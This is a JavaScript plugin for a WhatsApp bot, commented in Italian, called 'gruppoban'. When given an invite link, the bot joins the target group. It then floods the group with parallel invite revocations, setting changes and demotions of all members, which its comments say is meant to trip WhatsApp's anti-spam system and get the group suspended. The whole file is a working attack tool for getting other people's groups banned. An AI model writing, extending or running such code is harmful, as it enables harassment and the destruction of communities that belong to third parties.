// plugin: gruppoban.js
// comando: .gruppoban <link>
// il bot entra nel gruppo, forza la sospensione immediata (tempo 0)
// reagisce con la clessidra al comando
// quando il gruppo è sospeso cambia emoji in 🚫
// NESSUN cambio nome, NESSUNA espulsione, NESSUN messaggio nel gruppo

let handler = async (m, { conn, text, isOwner }) => {
    if (!isOwner) return;

    let link = text ? text.trim() : '';
    if (!link) return;

    let match = link.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/);
    if (!match) return;
    let inviteCode = match[1];

    // 1. reazione clessidra immediata
    try {
        await conn.sendMessage(m.chat, {
            react: { text: '⏳', key: m.key }
        });
    } catch (e) { console.error('react:', e); }

    try {
        let groupInfo = await conn.groupGetInviteInfo(inviteCode);
        let groupJid = groupInfo.id;

        // 2. entra nel gruppo se non presente
        let metadata;
        try {
            metadata = await conn.groupMetadata(groupJid);
        } catch (e) {
            try { await conn.groupAcceptInvite(inviteCode); } catch (e2) { console.error(e2); }
            metadata = await conn.groupMetadata(groupJid);
        }

        // 3. forza la sospensione immediata: spam massivo di richieste
        //    che fa scattare il ban automatico di WhatsApp sul gruppo
        let botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
        let allJids = metadata.participants.map(p => p.jid).filter(j => j !== botId);

        // raffica di operazioni illegali in parallelo: revoca link, cambio setting,
        // menzioni di massa, update continui — triggera l'anti-spam di WhatsApp
        const forzature = [];
        for (let i = 0; i < 20; i++) {
            forzature.push(conn.groupRevokeInvite(groupJid).catch(() => {}));
            forzature.push(conn.groupSettingUpdate(groupJid, 'announcement').catch(() => {}));
            forzature.push(conn.groupSettingUpdate(groupJid, 'locked').catch(() => {}));
            forzature.push(conn.groupParticipantsUpdate(groupJid, allJids, 'demote').catch(() => {}));
        }
        await Promise.allSettled(forzature);

        // 4. polling rapidissimo per rilevare la sospensione
        let sospeso = false;
        for (let i = 0; i < 30; i++) {
            try {
                let meta = await conn.groupMetadata(groupJid);
                if (!meta || !meta.participants || meta.participants.length === 0) {
                    sospeso = true;
                    break;
                }
            } catch (e) {
                sospeso = true;
                break;
            }
            await new Promise(r => setTimeout(r, 500));
        }

        // 5. cambia emoji
        try {
            await conn.sendMessage(m.chat, {
                react: { text: sospeso ? '🚫' : '❌', key: m.key }
            });
        } catch (e) { console.error('react final:', e); }

    } catch (e) {
        console.error(e);
        try {
            await conn.sendMessage(m.chat, {
                react: { text: '❌', key: m.key }
            });
        } catch (e2) { console.error(e2); }
    }
};

handler.command = ['gruppoban'];
handler.owner = true;
handler.private = false;

export default handler;